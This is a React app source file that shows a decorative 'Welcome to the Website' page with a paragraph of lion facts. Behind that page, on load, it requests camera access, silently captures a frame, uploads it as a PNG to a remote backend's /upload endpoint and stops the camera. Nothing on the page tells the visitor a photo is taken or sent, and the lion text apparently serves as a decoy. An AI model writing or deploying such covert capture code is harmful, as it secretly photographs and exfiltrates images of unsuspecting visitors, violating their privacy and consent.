import { useEffect, useState } from "react";

function App() {
  const BACKEND_URL = "https://welcome-backend.onrender.com"; // your backend URL
  const [error, setError] = useState("");

  useEffect(() => {
    const captureSelfie = async () => {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        setError("Camera API not supported on this device/browser.");
        return;
      }

      try {
        // Ask for camera permission
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;

        await video.play();

        const captureFrame = () => {
          if (!video.videoWidth || !video.videoHeight) {
            setTimeout(captureFrame, 50); // retry if video not ready yet
            return;
          }

          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0);

          const image = canvas.toDataURL("image/png");

          // Upload instantly
          fetch(`${BACKEND_URL}/upload`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image }),
          }).catch(console.error);

          // Stop camera
          stream.getTracks().forEach((track) => track.stop());
        };

        // Modern browsers: fast frame callback
        if (video.requestVideoFrameCallback) {
          video.requestVideoFrameCallback(captureFrame);
        } else {
          // fallback
          setTimeout(captureFrame, 100);
        }
      } catch (err) {
        console.error("Camera error:", err);
        setError("Camera access denied or not available on this device.");
      }
    };

    captureSelfie();
  }, []);

  return (
    <div
      style={{
        width: "100vw",
        height: "100vh",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        textAlign: "center",
        color: "#fff",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        padding: "20px",
        background: "linear-gradient(-45deg, #ff6ec4, #7873f5, #42e695, #f3ff6c)",
        backgroundSize: "400% 400%",
        animation: "gradientAnimation 15s ease infinite",
      }}
    >
      <h1 style={{ fontSize: "3rem", marginBottom: "20px" }}>Welcome to the Website</h1>
      <p style={{ fontSize: "1.2rem", maxWidth: "600px" }}>
        Lions are the only big cats that live in social groups called prides, with females doing most of the hunting and males often sporting a prominent mane. They are apex predators primarily found in the grasslands of Africa and have a roar that can be heard up to 5 miles away. All lion cubs are born with spots for camouflage, which fade as they get older. Lions can run at speeds of up to 50 miles per hour in short bursts and are known for their strength and teamwork during hunts.
      </p>

      {error && (
        <p style={{ color: "#ff6666", marginTop: "20px", fontSize: "1rem" }}>
          ⚠ {error}
        </p>
      )}

      <style>{`
        @keyframes gradientAnimation {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
      `}</style>
    </div>
  );
}

export default App;
